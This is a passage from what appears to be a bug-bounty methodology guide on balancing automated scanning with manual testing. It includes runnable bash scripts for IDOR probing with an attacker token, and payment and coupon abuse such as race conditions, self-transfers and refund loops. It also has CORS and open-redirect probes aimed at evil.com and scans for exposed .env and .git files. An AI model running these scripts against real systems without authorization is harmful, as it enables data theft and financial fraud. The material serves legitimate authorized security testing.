      WRITE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X "$method" "$MODIFIED" \
        -H "Authorization: Bearer $ACCOUNT_A_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"test":"value"}' --max-time 5)
      [ "$WRITE_STATUS" = "200" ] && \
        echo "  [WRITE IDOR] $method succeeded! HTTP $WRITE_STATUS"
    done
    
    echo ""
  done < id_based_endpoints.txt

  # MANUAL: Test non-obvious IDOR vectors
  echo "[MANUAL] Testing non-obvious IDOR vectors..."

  # GraphQL IDOR
  curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer $ACCOUNT_A_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ user(id: \\\"$ACCOUNT_B_ID\\\") { email phone orders { total } } }\"}"

  # IDOR via file/document access
  curl -s "https://target.com/api/documents?owner=$ACCOUNT_B_ID" \
    -H "Authorization: Bearer $ACCOUNT_A_TOKEN"

  # IDOR via notification/message endpoints
  curl -s "https://target.com/api/messages?to=$ACCOUNT_B_ID" \
    -H "Authorization: Bearer $ACCOUNT_A_TOKEN"
  ```
  ::

  ::tabs-item{icon="i-lucide-brain" label="Business Logic Hybrid Workflow"}

  ```bash
  # ═══════════════════════════════════════
  # Business Logic: 5% Auto → 95% Manual
  # ═══════════════════════════════════════

  # AUTO (5%): Map the application workflow
  # Use automated crawling to understand the application structure
  katana -u "https://target.com" -d 10 -jc -silent | \
    grep -iE "cart|order|pay|checkout|transfer|send|approve|delete|admin|config" | \
    sort -u > workflow_endpoints.txt
  echo "[AUTO] Workflow-related endpoints: $(wc -l < workflow_endpoints.txt)"

  # >>> EVERYTHING ELSE IS MANUAL <<<

  # MANUAL: Map the intended workflow
  echo "=== Intended Workflow Mapping ==="
  echo "1. Browse products → 2. Add to cart → 3. Apply coupon → 4. Checkout"
  echo "   → 5. Enter payment → 6. Confirm → 7. Order created"
  echo ""

  # MANUAL: Test workflow violations

  # Test: Skip payment step
  echo "[TEST] Skip payment step"
  ORDER=$(curl -s -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"items":[{"id":"1","qty":1}]}' | jq -r '.order_id')
  
  # Try to confirm without paying
  curl -s -X POST "https://target.com/api/orders/${ORDER}/confirm" \
    -H "Authorization: Bearer TOKEN"

  # Test: Apply coupon after payment
  echo "[TEST] Apply coupon after payment"
  curl -s -X POST "https://target.com/api/orders/${ORDER}/coupon" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"SAVE50"}'

  # Test: Modify quantity after price lock
  echo "[TEST] Modify quantity after price calculation"
  curl -s -X PATCH "https://target.com/api/orders/${ORDER}" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"items":[{"id":"1","qty":100}]}'

  # Test: Negative values
  echo "[TEST] Negative quantity/amount"
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"product_id":"1","quantity":-5}'

  # Test: Race condition on coupon
  echo "[TEST] Race condition — apply same coupon multiple times"
  for i in $(seq 1 30); do
    curl -s -X POST "https://target.com/api/cart/coupon" \
      -H "Authorization: Bearer TOKEN" \
      -d '{"code":"ONETIME50"}' &
  done
  wait

  # Test: Transfer to self for infinite money
  echo "[TEST] Self-transfer loop"
  curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"from":"MY_ACCOUNT","to":"MY_ACCOUNT","amount":100}'

  # Test: Cancel and refund loop
  echo "[TEST] Order → Receive → Cancel → Refund (keep product + money)"
  curl -s -X POST "https://target.com/api/orders/${ORDER}/cancel" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"reason":"changed mind"}'
  # Check: Is refund issued? Can order status be changed back?
  ```
  ::
::

---

## Efficiency Metrics & Optimization

::badge
Performance Tracking
::

### Measuring Your Balance Effectiveness

::tabs
  ::tabs-item{icon="i-lucide-bar-chart" label="Tracking Metrics"}

  ```bash
  # Bug hunting session tracker
  cat << 'TRACKER' > session_tracker.sh
  #!/bin/bash
  # Track time spent and findings per approach
  
  SESSION_LOG="session_$(date +%Y%m%d_%H%M).json"
  
  cat << EOF > "$SESSION_LOG"
  {
    "target": "$1",
    "date": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "automated": {
      "recon_time_minutes": 0,
      "scanning_time_minutes": 0,
      "findings_count": 0,
      "false_positives": 0,
      "confirmed_vulns": 0,
      "tools_used": []
    },
    "manual": {
      "analysis_time_minutes": 0,
      "testing_time_minutes": 0,
      "findings_count": 0,
      "false_positives": 0,
      "confirmed_vulns": 0,
      "techniques_used": []
    },
    "hybrid": {
      "auto_discovered_manual_exploited": 0,
      "manual_discovered_auto_confirmed": 0,
      "chained_findings": 0
    },
    "outcomes": {
      "reports_submitted": 0,
      "accepted": 0,
      "duplicates": 0,
      "informational": 0,
      "total_bounty": 0
    }
  }
  EOF
  
  echo "Session log created: $SESSION_LOG"
  echo "Update this file as you progress through the engagement"
  TRACKER
  chmod +x session_tracker.sh
  ```

  ```
  ┌──────────────────────────────────────────────────────────┐
  │           EFFICIENCY METRICS DASHBOARD                   │
  │                                                          │
  │   Key Performance Indicators:                            │
  │   ─────────────────────────                              │
  │                                                          │
  │   Finding Rate = Confirmed Vulns / Hours Spent           │
  │   Auto Efficiency = Auto Findings / Auto Time            │
  │   Manual Efficiency = Manual Findings / Manual Time      │
  │   False Positive Rate = FP / Total Auto Findings         │
  │   Chain Rate = Chained Findings / Total Findings         │
  │   Duplicate Rate = Duplicates / Total Submissions        │
  │   ROI = Bounty Earned / Total Hours                      │
  │                                                          │
  │   Optimal Balance Indicators:                            │
  │   ─────────────────────────                              │
  │   • Auto FP Rate < 30% → automation is well-tuned       │
  │   • Manual finding severity > Auto → correct allocation  │
  │   • Chain Rate > 15% → good manual analysis              │
  │   • Duplicate Rate < 20% → good target selection         │
  │   • $/hour > $50 → sustainable hunting                   │
  └──────────────────────────────────────────────────────────┘
  ```
  ::

  ::tabs-item{icon="i-lucide-settings" label="Optimization Strategies"}

  ```bash
  # Strategy 1: Pre-filter automated results before manual review
  # Reduce noise by filtering common false positives

  # Filter nuclei results — remove informational
  cat nuclei_results.txt | grep -vE "\[info\]|\[low\]" > nuclei_actionable.txt

  # Filter XSS results — verify reflection actually exists
  cat xss_results.txt | while read finding; do
    URL=$(echo "$finding" | grep -oP 'https?://[^\s]+')
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" --max-time 5)
    [ "$STATUS" = "200" ] && echo "$finding"
  done > xss_verified.txt

  # Strategy 2: Prioritize manual testing by automation signals
  echo "=== Auto-Guided Manual Priority ==="

  # High priority: Endpoints returning 403 (potential bypass)
  cat urls.txt | httpx -silent -mc 403 > manual_priority_403.txt
  echo "403 endpoints (bypass candidates): $(wc -l < manual_priority_403.txt)"

  # High priority: Endpoints with inconsistent auth
  cat urls.txt | while read url; do
    NOAUTH=$(curl -s -o /dev/null -w "%{http_code}" "$url" --max-time 3)
    AUTH=$(curl -s -o /dev/null -w "%{http_code}" "$url" \
      -H "Authorization: Bearer TOKEN" --max-time 3)
    if [ "$NOAUTH" = "$AUTH" ] && [ "$AUTH" = "200" ]; then
      echo "[NO AUTH NEEDED] $url"
    fi
  done > manual_priority_noauth.txt

  # High priority: Endpoints with large response differences per user
  echo "[*] Test same endpoints with different user tokens"
  echo "[*] Large response size differences = potential data exposure"

  # Strategy 3: Create reusable automation for repetitive manual patterns
  # If you find yourself manually testing IDOR on every target,
  # build a semi-automated IDOR tester

  cat << 'IDOR_SCRIPT' > semi_auto_idor.sh
  #!/bin/bash
  # Semi-automated IDOR tester
  # Usage: ./semi_auto_idor.sh base_url attacker_token victim_id
  
  BASE="$1"
  TOKEN="$2"
  VID="$3"
  
  ENDPOINTS=$(curl -s "${BASE}/api/swagger.json" 2>/dev/null | \
    jq -r '.paths | keys[]' | grep -iE '{.*id}')
  
  echo "$ENDPOINTS" | while read ep; do
    TESTED=$(echo "$ep" | sed "s/{[^}]*}/${VID}/g")
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "${BASE}${TESTED}" -H "Authorization: Bearer $TOKEN")
    if [ "$STATUS" = "200" ]; then
      echo "[IDOR] $TESTED → HTTP $STATUS"
      # Show first 200 chars of response for human review
      curl -s "${BASE}${TESTED}" -H "Authorization: Bearer $TOKEN" | \
        head -c 200
      echo ""
      echo "--- Review above and decide if this is a real IDOR ---"
    fi
  done
  IDOR_SCRIPT
  chmod +x semi_auto_idor.sh
  ```
  ::
::

---

## Anti-Patterns to Avoid

::caution
These are common mistakes that waste time and reduce finding quality.
::

::accordion
  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Anti-Pattern 1: Scanner-Only Hunting"
  ---

  **Problem:** Running nuclei/dalfox/sqlmap against a target and submitting whatever comes out.

  **Why it fails:**
  - Every other hunter runs the same scanners
  - Results in **90%+ duplicate rate**
  - False positives get your account flagged
  - Misses all business logic, auth, and chain vulnerabilities
  - Programs devalue your reports over time

  **Fix:** Use scanners for reconnaissance only. Spend 70%+ of your time on manual analysis of scanner-identified anomalies.

  ```bash
  # BAD: Scanner-only approach
  nuclei -u target.com -o results.txt
  # Submit everything in results.txt → mostly duplicates

  # GOOD: Scanner-guided manual approach
  nuclei -u target.com -o results.txt
  # Review results.txt manually
  # For each finding:
  #   1. Verify it's real (not false positive)
  #   2. Check if it's already reported (search disclosure databases)
  #   3. Escalate impact manually
  #   4. Chain with other findings
  #   5. Build complete PoC
  #   6. Submit with full CDA
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Anti-Pattern 2: Manual-Only on Large Targets"
  ---

  **Problem:** Spending days manually testing every endpoint on a large application without automated reconnaissance.

  **Why it fails:**
  - **Missing 80% of the attack surface** you don't know about
  - Hidden subdomains, API versions, and endpoints go untested
  - No JavaScript analysis for client-side vulnerabilities
  - Inefficient use of time on endpoints that could be quickly filtered

  **Fix:** Always start with automated reconnaissance. Let tools map the full attack surface before choosing where to manually deep-dive.

  ```bash
  # BAD: Manual-only on large target
  # Manually browse target.com for 3 hours
  # Only discover 50 endpoints
  # Miss api.target.com, staging.target.com, admin.target.com

  # GOOD: Auto recon → Manual focus
  subfinder -d target.com -all -silent | httpx -silent  # Discover 200 subdomains
  katana -u https://target.com -d 5 -jc -silent        # Discover 5000 URLs
  # Now manually focus on the most interesting 50 endpoints
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Anti-Pattern 3: Not Adapting the Balance"
  ---

  **Problem:** Using the same automation-to-manual ratio for every target and every vulnerability class.

  **Why it fails:**
  - A banking application needs **90% manual** testing (business logic, auth)
  - A static marketing site might need **90% automated** testing (known CVEs, misconfigs)
  - Different vulnerability classes demand different ratios

  **Fix:** Assess the target first, then choose your balance. Adjust continuously based on findings.

  ```bash
  # Target assessment to determine balance
  TARGET="target.com"
  
  # Check complexity indicators
  TECH=$(httpx -u "https://$TARGET" -tech-detect -silent)
  ENDPOINTS=$(katana -u "https://$TARGET" -d 3 -jc -silent | wc -l)
  AUTH=$(curl -s -I "https://$TARGET/api/" | grep -c "401\|403")
  
  echo "Technology: $TECH"
  echo "Endpoints: $ENDPOINTS"
  echo "Auth required: $AUTH"
  
  if [ "$AUTH" -gt 0 ] && [ "$ENDPOINTS" -gt 100 ]; then
    echo "RECOMMENDATION: Heavy manual testing (30% auto / 70% manual)"
    echo "Focus: Auth bypass, IDOR, business logic, API abuse"
  elif [ "$ENDPOINTS" -lt 20 ]; then
    echo "RECOMMENDATION: Balanced (50% auto / 50% manual)"
    echo "Focus: Deep dive on each endpoint with both approaches"
  else
    echo "RECOMMENDATION: Auto-heavy recon (70% auto / 30% manual)"
    echo "Focus: Wide scanning, then manual on anomalies"
  fi
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Anti-Pattern 4: Ignoring Automation Output"
  ---

  **Problem:** Running automated tools but never reviewing the output systematically.

  **Why it fails:**
  - Tools generate thousands of data points that contain **hidden gold**
  - A single anomalous response size could indicate a critical data leak
  - Error messages in automated responses reveal technology details for manual exploitation
  - You paid the time cost of automation but got none of the benefit

  **Fix:** Build a systematic triage process for all automated output.

  ```bash
  # Systematic output review process
  echo "=== Automated Output Triage Checklist ==="

  # 1. Sort by severity
  cat nuclei_results.txt | sort -t'[' -k2 | tac

  # 2. Look for unique/unusual findings
  cat nuclei_results.txt | awk -F'[][]' '{print $4}' | sort | uniq -c | sort -n
  # Findings that appear only once are more likely to be unique/valuable

  # 3. Cross-reference response sizes for anomalies
  cat httpx_results.json | jq -r '[.url, .content_length] | @tsv' | \
    sort -t$'\t' -k2 -n | tail -20
  # Largest responses often contain the most data

  # 4. Extract technology version info for CVE matching
  cat httpx_results.json | jq -r '.technologies[]?' | sort | uniq -c | sort -rn

  # 5. Flag all 403s for manual bypass testing
  cat httpx_results.json | jq -r 'select(.status_code == 403) | .url' > \
    manual_bypass_targets.txt
  ```
  ::
::

---

## Continuous Balance Calibration

::tip
Your optimal balance changes over time. Calibrate based on results, target maturity, and your growing skills.
::

```
┌────────────────────────────────────────────────────────────────────┐
│              BALANCE CALIBRATION OVER TIME                         │
│                                                                    │
│  Engagement      Auto %    Manual %    Rationale                   │
│  ──────────      ──────    ────────    ─────────                   │
│  Day 1           80%       20%         Map attack surface          │
│  Day 2           60%       40%         Scan + verify anomalies     │
│  Day 3           30%       70%         Deep dive on leads          │
│  Day 4+          20%       80%         Exploit, chain, escalate    │
│  Ongoing         10%       90%         Monitor + manual focus      │
│                                                                    │
│  Skill Level     Auto %    Manual %    Focus                       │
│  ───────────     ──────    ────────    ─────                       │
│  Beginner        70%       30%         Learn from tool output      │
│  Intermediate    50%       50%         Verify + basic exploitation │
│  Advanced        30%       70%         Complex chains, logic bugs  │
│  Expert          20%       80%         Novel attacks, 0-days       │
│                                                                    │
│  Target Type     Auto %    Manual %    Reason                      │
│  ───────────     ──────    ────────    ──────                      │
│  New program     70%       30%         Low-hanging fruit first     │
│  Mature program  20%       80%         Easy bugs already found     │
│  Large surface   60%       40%         Need breadth coverage       │
│  Small surface   30%       70%         Need depth analysis         │
│  API-only        40%       60%         Logic + auth focus          │
│  Web app         50%       50%         Balanced approach           │
└────────────────────────────────────────────────────────────────────┘
```

### Adaptive Balance Script

::code-collapse

```bash
#!/bin/bash
# adaptive_balance.sh — Determines optimal testing balance for a target
# Usage: ./adaptive_balance.sh target.com

TARGET="$1"

echo "═══════════════════════════════════════════"
echo "  ADAPTIVE TESTING BALANCE ADVISOR"
echo "  Target: $TARGET"
echo "═══════════════════════════════════════════"

# Factor 1: Attack surface size
SUBS=$(subfinder -d "$TARGET" -silent 2>/dev/null | wc -l)
LIVE=$(subfinder -d "$TARGET" -silent 2>/dev/null | httpx -silent 2>/dev/null | wc -l)

# Factor 2: Technology complexity
TECH_COUNT=$(httpx -u "https://$TARGET" -tech-detect -silent 2>/dev/null | \
  grep -oP '\[.*?\]' | tr ',' '\n' | wc -l)

# Factor 3: Authentication presence
AUTH_ENDPOINTS=$(katana -u "https://$TARGET" -d 3 -jc -silent 2>/dev/null | \
  grep -ciE "login|auth|signin|register|oauth|token|session")

# Factor 4: API presence
API_ENDPOINTS=$(katana -u "https://$TARGET" -d 3 -jc -silent 2>/dev/null | \
  grep -ciE "/api/|graphql|rest|swagger|openapi")

# Factor 5: Program maturity (check for existing reports)
# Estimate based on program age and public disclosures

echo ""
echo "Analysis Results:"
echo "  Subdomains: $SUBS"
echo "  Live hosts: $LIVE"
echo "  Technologies: $TECH_COUNT"
echo "  Auth endpoints: $AUTH_ENDPOINTS"
echo "  API endpoints: $API_ENDPOINTS"

# Calculate recommended balance
AUTO_SCORE=50  # Start at 50/50

# Large surface → more automation
[ "$SUBS" -gt 100 ] && AUTO_SCORE=$((AUTO_SCORE + 15))
[ "$SUBS" -gt 500 ] && AUTO_SCORE=$((AUTO_SCORE + 10))

# Complex tech → more manual
[ "$TECH_COUNT" -gt 5 ] && AUTO_SCORE=$((AUTO_SCORE - 10))

# Heavy auth → more manual  
[ "$AUTH_ENDPOINTS" -gt 5 ] && AUTO_SCORE=$((AUTO_SCORE - 15))

# Heavy API → more manual
[ "$API_ENDPOINTS" -gt 10 ] && AUTO_SCORE=$((AUTO_SCORE - 10))

# Clamp between 15-85
[ "$AUTO_SCORE" -lt 15 ] && AUTO_SCORE=15
[ "$AUTO_SCORE" -gt 85 ] && AUTO_SCORE=85

MANUAL_SCORE=$((100 - AUTO_SCORE))

echo ""
echo "═══════════════════════════════════════════"
echo "  RECOMMENDED BALANCE"
echo "  Automated: ${AUTO_SCORE}%"
echo "  Manual:    ${MANUAL_SCORE}%"
echo "═══════════════════════════════════════════"

if [ "$AUTO_SCORE" -gt 60 ]; then
  echo ""
  echo "  Strategy: RECON-HEAVY"
  echo "  Focus automated tools on wide coverage first."
  echo "  Manual deep-dive on anomalies and interesting endpoints."
  echo ""
  echo "  Automated priorities:"
  echo "    1. Full subdomain enumeration"
  echo "    2. Nuclei CVE + misconfiguration scanning"
  echo "    3. Directory and file fuzzing"
  echo "    4. XSS parameter fuzzing"
  echo ""
  echo "  Manual priorities:"
  echo "    1. Verify and escalate automated findings"
  echo "    2. Auth bypass on 403 endpoints"
  echo "    3. Business logic on key workflows"
elif [ "$AUTO_SCORE" -gt 40 ]; then
  echo ""
  echo "  Strategy: BALANCED"
  echo "  Split time evenly between automated scanning and manual analysis."
  echo ""
  echo "  Automated priorities:"
  echo "    1. Endpoint and parameter discovery"
  echo "    2. Known vulnerability scanning"
  echo "    3. CORS and header checks"
  echo ""
  echo "  Manual priorities:"
  echo "    1. IDOR and authorization testing"
  echo "    2. API abuse and mass assignment"
  echo "    3. Authentication flow analysis"
  echo "    4. Business logic testing"
else
  echo ""
  echo "  Strategy: DEPTH-FOCUSED"
  echo "  Minimal automated scanning. Heavy manual testing required."
  echo ""
  echo "  Automated priorities:"
  echo "    1. Basic reconnaissance only"
  echo "    2. Technology fingerprinting"
  echo ""
  echo "  Manual priorities:"
  echo "    1. Complete authorization matrix testing"
  echo "    2. Business logic abuse in every workflow"
  echo "    3. Race condition testing"
  echo "    4. Multi-step exploit chains"
  echo "    5. API schema analysis and abuse"
  echo "    6. Payment and financial logic testing"
fi
```

::

---

## Automated Monitoring & Continuous Testing

::badge
Ongoing Strategy
::

### Background Automation While You Hunt Manually

::code-group

```bash [monitor_new_assets.sh]
#!/bin/bash
# Continuous subdomain monitoring — runs in background
# Alerts you when new subdomains appear (new attack surface)

TARGET="$1"
KNOWN_FILE="known_subs_${TARGET}.txt"
ALERT_FILE="new_subs_${TARGET}.txt"

# Initialize known subdomains
[ ! -f "$KNOWN_FILE" ] && subfinder -d "$TARGET" -all -silent | sort -u > "$KNOWN_FILE"

while true; do
  echo "[$(date)] Checking for new subdomains..."
  
  # Current scan
  subfinder -d "$TARGET" -all -silent | sort -u > /tmp/current_subs.txt
  
  # Find new subdomains
  comm -23 /tmp/current_subs.txt "$KNOWN_FILE" > /tmp/new_subs.txt
  
  NEW_COUNT=$(wc -l < /tmp/new_subs.txt)
  if [ "$NEW_COUNT" -gt 0 ]; then
    echo "[ALERT] $NEW_COUNT new subdomains found!"
    cat /tmp/new_subs.txt | tee -a "$ALERT_FILE"
    
    # Immediately probe new subdomains
    cat /tmp/new_subs.txt | httpx -silent -status-code -title -tech-detect
    
    # Quick vulnerability scan on new assets
    cat /tmp/new_subs.txt | httpx -silent | nuclei -severity critical,high -silent
    
    # Update known list
    cat /tmp/new_subs.txt >> "$KNOWN_FILE"
    sort -u "$KNOWN_FILE" -o "$KNOWN_FILE"
  fi
  
  # Check every 6 hours
  sleep 21600
done
```

```bash [monitor_changes.sh]
#!/bin/bash
# Content change monitoring — detects when pages change (new features = new bugs)

TARGET="$1"
WATCH_FILE="watch_urls.txt"
HASH_DIR="page_hashes"

mkdir -p "$HASH_DIR"

# URLs to monitor (add your high-value targets)
cat << EOF > "$WATCH_FILE"
https://${TARGET}/api/swagger.json
https://${TARGET}/robots.txt
https://${TARGET}/sitemap.xml
https://${TARGET}/js/app.js
https://${TARGET}/api/v1/docs
https://${TARGET}/changelog
EOF

while true; do
  echo "[$(date)] Checking for content changes..."
  
  while read url; do
    FILENAME=$(echo "$url" | md5sum | awk '{print $1}')
    CURRENT_HASH=$(curl -s "$url" --max-time 10 | md5sum | awk '{print $1}')
    
    if [ -f "${HASH_DIR}/${FILENAME}" ]; then
      OLD_HASH=$(cat "${HASH_DIR}/${FILENAME}")
      if [ "$CURRENT_HASH" != "$OLD_HASH" ]; then
        echo "[CHANGE DETECTED] $url"
        echo "  Old hash: $OLD_HASH"
        echo "  New hash: $CURRENT_HASH"
        echo "  → Manual investigation recommended"
      fi
    fi
    
    echo "$CURRENT_HASH" > "${HASH_DIR}/${FILENAME}"
  done < "$WATCH_FILE"
  
  # Check every 2 hours
  sleep 7200
done
```

```bash [auto_retest.sh]
#!/bin/bash
# Automated re-testing of previously found vulnerability patterns
# Run periodically to catch regressions or new instances

TARGET="$1"

echo "[$(date)] Running automated regression tests..."

# Re-check known vulnerability patterns
# CORS misconfigurations
cat live_hosts.txt | while read host; do
  CORS=$(curl -s -I "https://${host}" -H "Origin: https://evil.com" --max-time 5 | \
    grep -i "access-control-allow-origin: https://evil.com")
  [ -n "$CORS" ] && echo "[CORS REGRESSION] $host"
done

# Open redirect patterns
cat parameterized.txt | grep -iE "redirect|return|next|url" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location -mc 301,302 --max-time 5 | \
  grep "evil.com" | while read finding; do
  echo "[OPEN REDIRECT REGRESSION] $finding"
done

# Sensitive file exposure
for path in .env .git/HEAD .git/config debug.log error.log; do
  cat live_hosts.txt | while read host; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://${host}/${path}" --max-time 3)
    [ "$STATUS" = "200" ] && echo "[EXPOSURE REGRESSION] https://${host}/${path}"
  done
done

echo "[$(date)] Regression tests complete"
```

::

---

## Balance Assessment Checklist

::card-group
  ::card
  ---
  title: Before Starting
  icon: i-lucide-clipboard-check
  ---
  - Assess target size and complexity
  - Identify program maturity level
  - Check scope and allowed testing methods
  - Plan time allocation (auto vs manual)
  - Set up monitoring for new assets
  ::

  ::card
  ---
  title: During Testing
  icon: i-lucide-activity
  ---
  - Let automation run in background during manual testing
  - Review automated output every 30–60 minutes
  - Switch to manual when automation finds anomalies
  - Track time spent per approach
  - Adjust balance based on findings
  ::

  ::card
  ---
  title: After Testing
  icon: i-lucide-check-circle
  ---
  - Analyze which approach found each vulnerability
  - Calculate finding rate per hour for each approach
  - Identify what automation missed (manual-only findings)
  - Identify what manual missed (auto-only findings)
  - Refine balance for next engagement
  ::

  ::card
  ---
  title: Continuous Improvement
  icon: i-lucide-refresh-cw
  ---
  - Build custom nuclei templates from manual findings
  - Create semi-automated scripts for repetitive manual patterns
  - Maintain personal wordlists from successful fuzzing
  - Track optimal balance ratios per target type
  - Share and refine methodology with community
  ::
::

::caution
Never rely solely on automation for security-critical testing. Automated tools are powerful aids, but they cannot replace human intelligence for understanding business context, identifying logic flaws, or crafting novel exploit chains. The optimal balance requires continuous calibration based on the specific target, your skill level, and the vulnerability classes you're pursuing.
::